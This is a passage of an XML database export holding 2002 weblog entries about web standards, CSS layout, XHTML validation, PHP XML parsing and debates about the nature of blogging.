&lt;p&gt;Etiquette question: What is accepted etiquette for posting quotes from mailing list material?  Webdesign-L does not maintain publically accessible archives anywhere, but is a veritable gold mine of information. Should I consider everything on the list as fair game to be blogged whenever it takes my interest (obviously maintaining credit to the original writer) or should I contact authors for permission first? No comments system yet, so see my &lt;a href=&quot;/~cs1spw/blog/contact/&quot;&gt;contact page&lt;/a&gt; if you have a reply.&lt;/p&gt;</field>
		<field name="created">2002-06-15 12:45:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">27</field>
		<field name="title">Pure CSS popups</field>
		<field name="slug">pureCssPopups</field>
		<field name="body">&lt;p&gt;New example on Eric Meyer's css/edge: &lt;a href=&quot;http://www.meyerweb.com/eric/css/edge/menus/demo.html&quot;&gt;Pure CSS Menus&lt;/a&gt;. This is very impressive stuff - it's an implementation of those dropdown menus where you hover over an item and a new menu pops up, but it's done in pure CSS without a line of javascript. Even better, the markup for the menu is a nested unordered list, so browsers that don't support the advanced CSS needed will still display the menu in a meaningful way.&lt;/p&gt;

&lt;p&gt;The example requires &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;Mozilla 1.0&lt;/a&gt;, as do many of the other &lt;a href=&quot;http://www.meyerweb.com/eric/css/edge/&quot;&gt;css/edge&lt;/a&gt; demos. The site has some fantastic experiments on it (all with full explanations and freely available source code) and is well worth exploring.&lt;/p&gt;</field>
		<field name="created">2002-06-15 13:03:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">28</field>
		<field name="title">User Agent list</field>
		<field name="slug">userAgentList</field>
		<field name="body">&lt;p&gt;rudy on &lt;a href=&quot;http://lists.evolt.org/&quot;&gt;thelist&lt;/a&gt; pointed me to this handy &lt;a href=&quot;http://www.psychedelix.com/agents.html&quot;&gt;List of User Agents&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-15 14:25:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">29</field>
		<field name="title">JSRS 2.1 released</field>
		<field name="slug">jsrs21Released</field>
		<field name="body">&lt;p&gt;Brent Ashley: &lt;a href=&quot;http://brentashley.blogchat.com/archives/000373.html#000373&quot;&gt;JSRS2.1 Released&lt;/a&gt; (from June 10th). JSRS is Javascript Remote Scripting, an incredibly powerful javascript library that allows DHTML pages to communicate with a web server without having to reload the page. This latest version fixes POST suport for Mozilla. The library opens the way for a whole host of interactive web applications without the normal limitations caused by the request-and-response nature of the web. Best of all, JSRS is cross platform (at least for Mozilla, NS4+ and IE4+).&lt;/p&gt;

&lt;p&gt;Brent actually has two implementations available. &lt;a href=&quot;http://ashleyit.com/rs/jsrs/test.htm&quot;&gt;JSRS&lt;/a&gt; uses DHTML elements (such as hidden iframes) to make RPC calls to the server, while &lt;a href=&quot;http://ashleyit.com/rs/rslite/&quot;&gt;RSLite&lt;/a&gt; is an ultra lightweight version that uses cookies for communication (and even works on Opera!). Both implementations are free and come with source code, as well as example server side implementations in a variety of languages including ASP and PHP.&lt;/p&gt;</field>
		<field name="created">2002-06-15 20:18:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">30</field>
		<field name="title">The nature of blogging</field>
		<field name="slug">theNatureOfBlogging</field>
		<field name="body">&lt;p&gt;Meg Hourihan's &lt;a href=&quot;http://www.oreillynet.com/pub/a/javascript/2002/06/13/megnut.html&quot; title=&quot;What We&amp;apos;re Doing When We Blog&quot;&gt;explanation of blogging&lt;/a&gt; (which I &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/15/#megOnBlogging&quot;&gt;linked to and praised&lt;/a&gt; earlier) is stirring up something of a storm. Meg's suggestion that the key to blogging is the format has been ripped to pieces by the likes of &lt;a href=&quot;http://weblog.burningbird.net/archives/000281.php&quot;&gt;BurningBird&lt;/a&gt;, &lt;a href=&quot;http://weblog.delacour.net/archives/000534.html&quot;&gt;Jonathan Delacour&lt;/a&gt; and &lt;a href=&quot;http://www.emptybottle.org/glass/week_2002_06_09.html#002925&quot;&gt;Stavros&lt;/a&gt;. Jonathan uses photography as an analogy - some photographers are excellent technically and concentrate on taking the perfect photograph while losing sight of the art of the medium. I hope I'm not overquoting, but Jonathan clinched his argument for me with the following:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Which is not to say there's no place for an explanation of the mechanics of weblogging: tools, posts, links, time-stamps, permalinks... But wouldn't it be better to leave those prosaic details for later? And to start by mapping out an imaginative vision of the medium's potential?&lt;/p&gt;

&lt;p&gt;To focus attention on the magic and mystery of blogging. To acknowledge (paraphrasing Burningbird) that the key to weblogging is people, not a format. To admit that -five years on- we're only just starting to realize what might be possible. To stress the communal nature of the activity. To celebrate the amplification of meaning that occurs when smart, creative people collaborate. To invite newcomers to join a grand adventure, a networked version of &lt;i&gt;Hesse's Journey to the East&lt;/i&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As a new blogger I am still trying to come to terms with the format and how it works. I think this is why I was initialy so impressed with what Meg had to say - she described blogging in technical terms that made sense to the logical part of my mind. My opinion has been reversed thanks to the interlinked nature of the blogging community, which lead me to opposing viewpoints and helped dramatically improve my understanding of what it is to blog.&lt;/p&gt;

&lt;p&gt;I notice Jonathan, BurningBird and Stavros are all on the faculty of &lt;a href=&quot;http://www.seabury.edu/faculty/akma/blog.html&quot;&gt;AKMA's University of Blogaria&lt;/a&gt;. I wonder if they are accepting undergraduates.&lt;/p&gt;</field>
		<field name="created">2002-06-15 20:42:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">31</field>
		<field name="title">Anil Dash does Amazon</field>
		<field name="slug">amilDashDoesAmazon</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.dashes.com/anil/index.php?blogarch/2002_06_01_archive.php#85171160&quot;&gt;Anil Dash&lt;/a&gt; provides a &lt;a href=&quot;http://www.dashes.com/anil/stuff/Amazon_valid.html&quot;&gt;copy of Amazon's home page&lt;/a&gt; in HTML 4.0 Transitional, and it &lt;a href=&quot;http://validator.w3.org/check?uri=http%3A//www.dashes.com/anil/stuff/Amazon_valid.html&quot;&gt;validates&lt;/a&gt;. Solid proof that you can rewrite a complex ecommerce site in valid HTML, and another victory for the web standards movement.&lt;/p&gt;</field>
		<field name="created">2002-06-15 21:11:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">32</field>
		<field name="title">Has Paul finished?</field>
		<field name="slug">hasPaulFinished</field>
		<field name="body">&lt;p&gt;I wonder if &lt;a href=&quot;http://idontsmoke.co.uk/perceived/&quot; title=&quot;idontsmoke&quot;&gt;Paul Sowden&lt;/a&gt; has finished his exams yet.&lt;/p&gt;</field>
		<field name="created">2002-06-15 21:15:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">33</field>
		<field name="title">Meetup Launches</field>
		<field name="slug">meetupLaunch</field>
		<field name="body">&lt;p&gt;With launch notices on both &lt;a href=&quot;http://www.glish.com/archive.asp?file=2002_06_09_archive.xml#77784935&quot; title=&quot;Eric Costello&quot;&gt;glish&lt;/a&gt; and &lt;a href=&quot;http://www.37signals.com/svn/comment.php?postID=374&amp;amp;2&quot; title=&quot;37 Signals Collaborative Weblog&quot;&gt;Signal vs. Noise&lt;/a&gt; I just had to check out &lt;a href=&quot;http://www.meetup.com/&quot;&gt;MEETUP&lt;/a&gt;. I was not dissapointed. MEETUP is a beautifully simple concept that has been superbly executed. It aims to arrange real life get togethers around the world of people with similar interests. You simply find a topic that interests you and see when the next scheduled meetup for that topic in your area is, then enter your email address to have the site update you on the status of the meetup and remind you nearer the time. Meetup participants vote on the venue (from a list of over 11,000 suggested spots) and the rest is up to them. Why MEETUP?&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.meetup.com/&quot;&gt;
&lt;ol&gt;&lt;li&gt;Because nobody ever died of having too many friends.&lt;/li&gt;
&lt;li&gt;Because the Internet was made to connect people.&lt;/li&gt;
&lt;li&gt;Because you spend too much time in front of a screen.&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;

&lt;p&gt;Well worth checking out.&lt;/p&gt;</field>
		<field name="created">2002-06-15 21:43:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">34</field>
		<field name="title">Meg replies</field>
		<field name="slug">megReplies</field>
		<field name="body">&lt;p&gt;Meg has &lt;a href=&quot;http://weblog.delacour.net/archives/000534.html&quot;&gt;replied&lt;/a&gt; to Jonathan's criticism of her &lt;a href=&quot;http://www.oreillynet.com/pub/a/javascript/2002/06/13/megnut.html&quot;&gt;piece  on the nature of blogging&lt;/a&gt; via his site's comments system. She defends her original viewpoint, commenting on blogging that &lt;q cite=&quot;http://weblog.delacour.net/archives/000534.html&quot;&gt;we can't define this thing based on the content we're outputting&lt;/q&gt;. It looks like this debate still has quite a bit of life left in it.&lt;/p&gt;</field>
		<field name="created">2002-06-15 22:44:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">35</field>
		<field name="title">Fixed validation again</field>
		<field name="slug">fixedValidationAgain</field>
		<field name="body">&lt;p&gt;The road to &lt;a href=&quot;http://validator.w3.org/check/referer&quot; title=&quot;W3C Validator results for this page&quot;&gt;validity&lt;/a&gt; is frought with peril. I've just fixed another small group of errors that were preventing this page from validating (after spotting the ominous W3C validator in today's user-agent logs). This time is was a couple of forgotten &amp;lt;/p&amp;gt; tags and an unescaped ampersand.&lt;/p&gt;

&lt;p&gt;There has to be a technological way of helping avoid these errors. Originally I wanted to be able to edit my entries in some kind of specialised markup language (such as &lt;a href=&quot;http://c2.com/cgi/wiki?TextFormattingRules&quot;&gt;WikiText&lt;/a&gt; or UBBCode) that the blogging sofftware could convert into valid XHTML, but I quickly realised that the most flexible markup language for blog entries is XHTML itself thanks to the built in support for everything from quotes to lists and code samples.&lt;/p&gt;

&lt;p&gt;Thinking about it, almost all of the common errors I am experiencing come from the XML parser rather than the rules governing XHTML. I need an XML parser that examines each post as (or before) it is added to the blog and checks for well-formedness. Expat (used in PHP for event based XML parsing) does not validate documents against a DTD but it DOES die with an error if an XML document is malformed. It looks like it could be just what I need.&lt;/p&gt;

&lt;p&gt;The ideal alternative would be for the W3C to create a web service back end for their validator so blogging software can check the validity of new entries automatically.&lt;/p&gt;</field>
		<field name="created">2002-06-16 12:19:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">36</field>
		<field name="title">My first XHTML mind bomb</field>
		<field name="slug">myFirstXhtmlMindBomb</field>
		<field name="body">&lt;p&gt;I've been looking at PHP's &lt;a href=&quot;http://www.php.net/xml&quot;&gt;XML handling&lt;/a&gt; functions (in particular the &lt;a href=&quot;http://www.php.net/manual/en/function.xml-parse.php&quot;&gt;&lt;code&gt;xml_parse()&lt;/code&gt;&lt;/a&gt; function) and I've suddenly realised the advantages of writing entries in valid XHTML. Before I started this blog one of the features I considered adding was something that can pull all of the links out of an entry when it is submitted and index them or add them to a directory somewhere. I was preparing myself for some regular expression hacking, but thanks to XHTML this is now completely unnecessary. All I need to do is define a couple of handlers to deal with &amp;lt;a&amp;gt; tags and Expat will do the hard work for me. In fact, this approach gives me a great deal of flexibility in what I do with my entries. I can extract quotes and blockquotes, pick up on emphasized text and generally allow my blog software to &quot;understand&quot; my entries as and when I add them. The true benefits of XHTML have suddenly become clear.&lt;/p&gt;</field>
		<field name="created">2002-06-16 12:48:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">37</field>
		<field name="title">Jonathan on Mark</field>
		<field name="slug">jonathanOnMark</field>
		<field name="body">&lt;p&gt;Jonathan has &lt;a href=&quot;http://weblog.delacour.net/archives/000535.html&quot; title=&quot;Accessibility matters&quot;&gt;meta-blogged&lt;/a&gt; (I think that's the term) responses to Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/archives/rooms/30_days_to_a_more_accessible_weblog/index.html&quot; title=&quot;30 days to a more accessible weblog&quot;&gt;accessiblity series&lt;/a&gt;. He replies to &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/14/#markExplainsAll&quot;&gt;my query&lt;/a&gt; about the wisdom of limiting the series to bloggers rather than expanding it to cover as much as possible:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;That the series is aimed at webloggers rather than a more general web audience seems OK. Better to start with a defined target audience and trust that the story will ripple out from there.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;That makes sense, but I stand by my opinion that the web is in desperate need of a good quality resource on general site accessibility. Sounds like something for &lt;a href=&quot;http://www.webstandards.org/learn/&quot; title=&quot;Web Standards Project: Learn&quot;&gt;WaSP's &quot;learn&quot; section&lt;/a&gt; to think about. I plan to compile a set of links to general accessibility resources once Mark has finished his tutorial series.&lt;/p&gt;

&lt;p&gt;Jonathan also links to &lt;a href=&quot;http://www.wealthbondage.com/stories/2002/03/10/howToDisagreeAgreeablyOrAtLeastEffectively.html&quot;&gt;How to Disagree Agreeably, or at least Effectively&lt;/a&gt;, an insightful collection of quotes related to the article title.&lt;/p&gt;</field>
		<field name="created">2002-06-16 13:12:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">38</field>
		<field name="title">University of Blogaria</field>
		<field name="slug">universityOfBlogaria</field>
		<field name="body">&lt;p&gt;Apparently the &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/15/#theNatureOfBlogging&quot;&gt;University of Blogaria&lt;/a&gt; was founded on the principle that the ideal university would have &lt;q cite=&quot;http://weblog.delacour.net/archives/000536.html&quot;&gt;no students to contaminate the educational process&lt;/q&gt; (&lt;a href=&quot;http://weblog.delacour.net/archives/000536.html&quot; title=&quot;Just do it&quot;&gt;Jonathan Delacour&lt;/a&gt;). The only way in is to earn a position on the faculty, which no doubt requires slightly more than four days of blogging. Thank goodness their courses (or at least the benefits of their wisdom) are &lt;a href=&quot;http://www.seabury.edu/faculty/akma/blog.html&quot; title=&quot;AKMA&amp;apos;s list of faculty members, currently in the right hand column&quot;&gt;freely available to all&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-16 13:22:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">39</field>
		<field name="title">Excited about XWT</field>
		<field name="slug">excitedAboutXwt</field>
		<field name="body">&lt;p&gt;New toy: &lt;a href=&quot;http://www.xwt.org/&quot;&gt;XWT, the XML Windowing Toolkit&lt;/a&gt;. This is one impressive piece of open source software. It allows you to create a graphical user interface using relatively simple XML markup (with ECMAScript to define interactivity). Your application can then be executed using a browser plugin, implemented as an ActiveX component on IE and a Java applet everywhere else. The idea is not to write whole applications in XWT, but to create server side applications and provide a client side GUI using the toolkit. Both SOAP and XML-RPC are supported for communicating between client and server.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;http://www.xwt.org/demos.html&quot; title=&quot;XWT Demos&quot;&gt;demos&lt;/a&gt; on the site are very impressive (although slow over a modem) and the technology is at a stage in development where it is ready for deployment. For more information, check out the project's &lt;a href=&quot;http://www.xwt.org/faq.html&quot; title=&quot;XWT Frequently Asked Questions&quot;&gt;FAQ&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-16 15:10:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">40</field>
		<field name="title">Elm0 suggests libxml</field>
		<field name="slug">elm0Suggests</field>
		<field name="body">&lt;p&gt;Elm0 has suggested a solution to my XHTML &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/16/#fixedValidationAgain&quot;&gt;validation woes&lt;/a&gt; in a &lt;a href=&quot;http://www.wmhub.net/forums/showthread.php?s=&amp;amp;postid=14336#post14326&quot;&gt;thread on WMHub&lt;/a&gt;. He suggests using &lt;a href=&quot;http://www.xmlsoft.org/&quot; title=&quot;The XML C Library for Gnome&quot;&gt;libxml&lt;/a&gt; to validate new entries against a DTD, via PHP's &lt;a href=&quot;http://www.php.net/exec&quot;&gt;&lt;code&gt;exec()&lt;/code&gt;&lt;/a&gt; function. It looks like &lt;a href=&quot;http://www.xmlsoft.org/xmldtd.html#validate&quot;&gt;xmllint&lt;/a&gt; is just the command line tool I need - if only I could get it to compile on the University server. I'm getting &quot;out of space&quot; errors which is strange as I have over 10MB left on my account, so I'll assume for the moment that it's a problem with the server and try again in a few days.&lt;/p&gt;</field>
		<field name="created">2002-06-16 22:44:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">41</field>
		<field name="title">Micah's alternative Yahoo</field>
		<field name="slug">micahsAlternativeYahoo</field>
		<field name="body">&lt;p&gt;Micah S Sittig on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt; has created an &lt;a href=&quot;http://www.ugcs.caltech.edu/~takoyaki/css-test/yahoo_css/&quot; title=&quot;Micah&amp;apos;s version in CSS&quot;&gt;alternative version&lt;/a&gt; of the &lt;a href=&quot;http://www.yahoo.com/beta.html&quot; title=&quot;Yahoo&amp;apos;s new look&quot;&gt;new Yahoo site design&lt;/a&gt; using CSS for layout instead of tables. The aim of the excercise was to demonstrate how much code can be saved by using CSS, and this has been achieved admirably with a 60% reduction in overall page size. The new version was developed for Mozilla 1.1 and looks great in that browser, but fails to render quite as well in IE. Still, as a demonstration of the file size benefits that come with CSS it works fantastically well. A full overview of the project alogn with file size statistics and implementation details &lt;a href=&quot;http://www.ugcs.caltech.edu/~takoyaki/css-test/yahoobeta_css.html&quot; title=&quot;CSS vs Table layout: a code size comparison&quot;&gt;is available here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-17 01:13:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">42</field>
		<field name="title">Blog fixed</field>
		<field name="slug">blogFixed</field>
		<field name="body">&lt;p&gt;I've just finished rebuilding the main data file for this blog, after it became corrupted last night due to a &quot;Disk Quota Exceeded&quot; error. It looks like this was my fault - I inadvertantly filled up my disk space when I was playing around with libxml and PHP choked when it tried to save the latest update to my blog. Luckily no data was permanently lost as the archives are cached as flat files, which allowed me to rebuild the data file from scratch.&lt;/p&gt;

&lt;p&gt;I've also changed the front page to only display entries from the last three days. All older entries can be accessed through the &lt;a href=&quot;/~cs1spw/blog/archive/&quot;&gt;archive&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-17 21:31:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">43</field>
		<field name="title">Styling &amp;lt;hr&amp;gt;</field>
		<field name="slug">stylingHR</field>
		<field name="body">&lt;p&gt;Interesting thread today on &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt; about styling &amp;lt;hr&amp;gt; elements. I had tried this before with no luck, but the thread provided some useful tips. Marek Prokop provided &lt;a href=&quot;http://www.sovavsiti.cz/css/hr.html&quot; title=&quot;Styling &amp;lt;hr&amp;gt;&quot;&gt;this tutorial&lt;/a&gt;, and Kevin W responded with these tips on &lt;a href=&quot;http://stud3.tuwien.ac.at/~e9727077/opera/color_hr.html&quot;&gt;styling &amp;lt;hr&amp;gt; in Opera&lt;/a&gt;. Michael Guitton suggested that setting  &lt;code&gt;width: 100%;&lt;/code&gt; could help fix problems with Netscape 6.&lt;/p&gt;

&lt;p&gt;I currently use &amp;lt;hr&amp;gt; tags on this blog in between every article, but I have used CSS to prevent them from displaying. This is to ensure that browsers which do not interpret my stylesheet (such as Netscape 4) will still display some kind of divider between entries.&lt;/p&gt;</field>
		<field name="created">2002-06-17 21:40:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">44</field>
		<field name="title">Day 6: Doctypes</field>
		<field name="slug">day6Doctype</field>
		<field name="body">&lt;p&gt;Mark Pilgrim starts his series of weblog accessibility tips today with tutorial on &lt;a href=&quot;http://diveintomark.org/archives/2002/06/17.html#day_6_choosing_a_doctype&quot; title=&quot;Day 6: Choosing a DOCTYPE&quot;&gt;adding a doctype to a blog&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-17 21:42:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">45</field>
		<field name="title">AllTheWeb claims</field>
		<field name="slug">allthewebClaims</field>
		<field name="body">&lt;p&gt;Boston.com, via &lt;a href=&quot;http://slashdot.org/article.pl?sid=02/06/17/1323257&amp;amp;mode=nested&amp;amp;tid=95&quot; title=&quot;AllTheWeb Claims Bigger Index Than Google&quot;&gt;Slashdot&lt;/a&gt;: &lt;a href=&quot;http://www.boston.com/dailynews/168/economy/Online_search_engine_AlltheWeb%3A.shtml&quot;&gt;Online search engine AlltheWeb claims bigger index than Google&lt;/a&gt;. I was under the impression that the 2,073,418,204 quoted on &lt;a href=&quot;http://www.google.com/&quot;&gt;Google's home page&lt;/a&gt; is no longer accurate (it hasn't changed in months, and I know Google have been adding things to their index). I had a play with &lt;a href=&quot;http://www.alltheweb.com/&quot;&gt;AllTheWeb&lt;/a&gt; and it turned up some decent results for my test queries, but it seems to load slightly slower than Google. Further discussion on this can be found over at &lt;a href=&quot;http://www.webmasterworld.com/forum6/950.htm&quot; title=&quot;FAST have reached the 2 Billion index&quot;&gt;WebmasterWorld&lt;/a&gt;, which  is also home to the best &lt;a href=&quot;http://www.webmasterworld.com/forum3/&quot; title=&quot;Google forum on WebmasterWorld&quot;&gt;Google discussion forum&lt;/a&gt; I've ever seen.&lt;/p&gt;</field>
		<field name="created">2002-06-17 22:13:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">46</field>
		<field name="title">Open source economics</field>
		<field name="slug">openSourceEconomics</field>
		<field name="body">&lt;p&gt;Food for thought: Joel Spolsky on &lt;a href=&quot;http://www.joelonsoftware.com/articles/StrategyLetterV.html&quot; title=&quot;Strategy Letter V&quot;&gt;the economics of Open Source software&lt;/a&gt;. Joel starts by explaining the economic concept of &lt;em&gt;complements&lt;/em&gt; - products that complement your product so that if their price goes down, demand for your product increases. He then goes on to demonstrate how this concept explains the decision of several large companies (including IBM, Sun and HP) to financially support open source software. As is usual for &lt;a href=&quot;http://www.joelonsoftware.com/&quot;&gt;Joel on Software&lt;/a&gt; the article makes fascinating reading.&lt;/p&gt;</field>
		<field name="created">2002-06-17 22:29:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">47</field>
		<field name="title">Amazon with CSS</field>
		<field name="slug">amazonWithCSS</field>
		<field name="body">&lt;p&gt;More CSS layout fun courtesy of &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt;. This time Steve Clay has taken Anil Dash's &lt;a href=&quot;http://www.dashes.com/anil/index.php?blogarch/2002_06_01_archive.php#85171160&quot;&gt;standards compliant Amazon &lt;/a&gt; and &lt;a href=&quot;http://mrclay.org/amazon/&quot;&gt;reworked it to use CSS for layout&lt;/a&gt;. Unfortunately it is likely to be a while before a major ecommerce site or portal decides to go with a CSS layout simply because of the continuing relevance of Netscape 4 users, but these examples demonstrate how close we are to being able to leave the era of nested table designs behind us.&lt;/p&gt;</field>
		<field name="created">2002-06-17 22:57:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">48</field>
		<field name="title">Mark replies</field>
		<field name="slug">markReplies</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/&quot;&gt;Mark&lt;/a&gt; mailed me in response to &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/14/#markExplainsAll&quot;&gt;my query&lt;/a&gt; about limiting his accessibility series to weblogs rather than expanding it to cover general sites:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;
Because every project needs to start and end somewhere.  There are
disabilities I'm not covering at all.  There are certainly more than 25 things
that *every* site should implement.  And so forth.  Focusing on weblogs lets me
delve deeper into specifics about implementation.  This is already apparent in
day 6 -- talking about the specific templates in each weblogging system that you
need to check -- and it will become even more important later on.  Many of the
standard arguments against accessibility (my client doesn't want it, it's too
expensive, the site needs to look exactly like the brochure) don't apply to
weblogs, so I will use that to my advantage.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Concentrating on implementation sounds like a great idea - there are several accessibility resources explaining concepts but I haven't seen any that explain how accessibility can be achieved, especially by web content creators who are not HTML experts.&lt;/p&gt;</field>
		<field name="created">2002-06-17 23:49:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">49</field>
		<field name="title">Minimal XML</field>
		<field name="slug">minimalXml</field>
		<field name="body">Spotted on the &lt;a href=&quot;http://www.pythoncard.org/&quot;&gt;PythonCard&lt;/a&gt; mailing list - &lt;a href=&quot;http://www.docuverse.com/smldev/minxml.html&quot;&gt;Minimal XML&lt;/a&gt;:

&lt;blockquote cite=&quot;http://www.docuverse.com/smldev/minxmlspec.html&quot;&gt;&lt;p&gt;Minimal XML is a subset of XML 1.0; including features essential for data interchange applications, and excluding non-essential features that are arcane, legacy-related, problematic for data interchange applications, or redundant.&lt;/p&gt;

&lt;h4&gt;Goals:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;A subset that allows easily implemented parsers that are much faster and smaller than full XML parsers.&lt;/li&gt;
&lt;li&gt;A subset with simpler information model that can easily be mapped to other information models.&lt;/li&gt;
&lt;li&gt;A subset that is much easier to learn, teach, and use.&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;Minimal XML is a project of &lt;a href=&quot;http://www.docuverse.com/smldev/&quot;&gt;SML-DEV&lt;/a&gt;, who describe themselves as &lt;q cite=&quot;http://www.docuverse.com/smldev/&quot;&gt;a group of over 125 XML experts working to create simple XML standards and to simplify existing XML&lt;/q&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-18 15:29:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">50</field>
		<field name="title">Knowledge Management</field>
		<field name="slug">knowledgeManagement</field>
		<field name="body">&lt;p&gt;New buzzword (at least for me) - &lt;em&gt;Knowledge Management&lt;/em&gt;. Apparently this is a theoretical corner stone of content management, an area I'm very interested in. Plenty of information about it in &lt;a href=&quot;http://directory.google.com/Top/Reference/Knowledge_Management/&quot; title=&quot;DMOZ Knowledge Management category&quot;&gt;DMOZ&lt;/a&gt; as well.&lt;/p&gt;</field>
		<field name="created">2002-06-18 15:38:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">51</field>
		<field name="title">Email interfaces</field>
		<field name="slug">emailInterfaces</field>
		<field name="body">&lt;p&gt;Peter Van Dijck: &lt;a href=&quot;http://poorbuthappy.com/ease/emailinterface/&quot;&gt;Email interface design 101&lt;/a&gt; - a short article examining the possibilities of using email interfaces for web applications. This is an interesting topic and one that deserves further exploration. I am particularly interested in the security problems faced when building this kind of interface (something that is not covered by Peter's article) - how can you effectively secure an email interface? I'm guessing that for true security the only real solution is PGP encrypted mail and some kind of password driven authentication system. Peter's blog carries a &lt;a href=&quot;http://poorbuthappy.com/ease/000208.html&quot;&gt;discussion on the article&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-18 17:51:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">52</field>
		<field name="title">Suicidal chipmunk</field>
		<field name="slug">suicidalChipmunk</field>
		<field name="body">&lt;p&gt;From &lt;a href=&quot;http://answers.google.com/&quot;&gt;Google Answers&lt;/a&gt; via &lt;a href=&quot;http://www.eleganthack.com/archives/002707.html#002707&quot;&gt;Elegant Hack&lt;/a&gt;: &lt;a href=&quot;https://answers.google.com/answers/main?cmd=threadview&amp;amp;id=24343&quot;&gt;The tale of the suicidal chipmunk&lt;/a&gt;. On a related note, I saw chipmunks on sale at a farmer's show (the &lt;a href=&quot;http://www.bathandwest.co.uk/&quot;&gt;Bath and West&lt;/a&gt;) a few weeks ago for ten pounds each - very cute but I have no idea if they'd make good pets.&lt;/p&gt;</field>
		<field name="created">2002-06-18 18:11:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">53</field>
		<field name="title">PHP Documentor</field>
		<field name="slug">phpDocumentor</field>
		<field name="body">&lt;p&gt;phpDocumentor version 1.1.0rc2 has been released over at &lt;a href=&quot;http://www.phpdoc.org/&quot;&gt;www.phpdoc.org&lt;/a&gt;. The feature list (from their press release):&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;all known bugs in 1.1.0rc1 have been fixed&lt;/li&gt;
&lt;li&gt;fully 25% faster than version 1.0.0&lt;/li&gt;
&lt;li&gt;able to directly parse a CVS repository&lt;/li&gt;
&lt;li&gt;parses any php file, with multiple classes and functions in the same
file&lt;/li&gt;
&lt;li&gt;fully compliant with even the most esoteric php syntax
   (&lt;code&gt;$string = &amp;lt;&amp;lt;&amp;lt; EOF&lt;/code&gt;, for example)&lt;/li&gt;
&lt;li&gt;greatly improved ease of Converter programming&lt;/li&gt;
&lt;li&gt;parsing of global and static variables&lt;/li&gt;
&lt;li&gt;documentation of name conflicts between packages&lt;/li&gt;
&lt;li&gt;auto-linking to elements in any package&lt;/li&gt;
&lt;li&gt;error/warnings by line number and file to allow for debugging of
 documentation tags&lt;/li&gt;
&lt;li&gt;extensive documentation of the package, including a detailed
specification for tags and templates&lt;/li&gt;
&lt;li&gt;Open source, GPL&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The full &lt;a href=&quot;http://phpdocu.sourceforge.net/ChangeLog&quot;&gt;Changelog&lt;/a&gt; is also available. This looks like a very useful piece of software.&lt;/p&gt;</field>
		<field name="created">2002-06-18 18:59:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">54</field>
		<field name="title">Javascript select boxes</field>
		<field name="slug">javascriptSelectBoxes</field>
